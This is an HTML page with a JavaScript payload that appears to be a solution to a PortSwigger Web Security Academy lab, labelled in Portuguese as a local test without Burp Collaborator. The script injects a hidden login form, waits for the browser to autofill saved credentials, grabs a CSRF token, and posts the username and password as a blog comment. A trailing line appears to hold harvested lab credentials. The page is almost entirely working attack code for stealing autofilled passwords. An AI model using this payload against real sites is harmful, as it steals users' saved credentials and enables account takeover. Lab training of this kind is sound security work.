<html>
<head>
<script>
	var vulDomain = "ac5b1fdf1fbe790dc0625ad5000200b3";
	if(document.getElementById('myform')==null){
		document.write("<form name='myform' id='myform' method='post' action='https://" + vulDomain + ".web-security-academy.net/post/comment' autocomplete='on'><input type='text' name='username' id='username' autocomplete='on'><input type='password' id='password' name='password'  autocomplete='on'><input type='hidden' name='csrf' id='csrf' value=''><input type='hidden' name='postId' value='4'><textarea name='comment' id='comment'></textarea><input type='text' name='name' value='nome'><input type='email' name='email' value='p@g.c'><input type='text' name='website'></form>");
	}
	function sleep(ms) {
	  return new Promise(resolve => setTimeout(resolve, ms));
	}
	function registerusername(){
		var xhr = new XMLHttpRequest();xhr.open("GET", "https://" + vulDomain + ".web-security-academy.net/post?postId=4", true);
		xhr.withCredentials = true;
		xhr.send();
		xhr.onreadystatechange = function () {
		    if (this.readyState == 4) {
				parser = new DOMParser();
				var d = parser.parseFromString(xhr.responseText, "text/html");
				var cs = d.querySelector('input[name="csrf"]').value;
				document.getElementById('csrf').value = cs;
				document.getElementById('comment').value = document.getElementById('username').value + " " + document.getElementById('password').value;
				document.getElementById('myform').submit();
		    }
		}
	}
	async function run() {
		//waits for the browser to autocomplete inputs.
	  	await sleep(2000);
	  	registerusername();
	}
	run();
</script>
</head>
<body>
Teste local da solucao sem precisar usar o BurpCollaborator
</body>
</html>


administratoradministratoradministrator q6vykrwpzy6tifj0g58p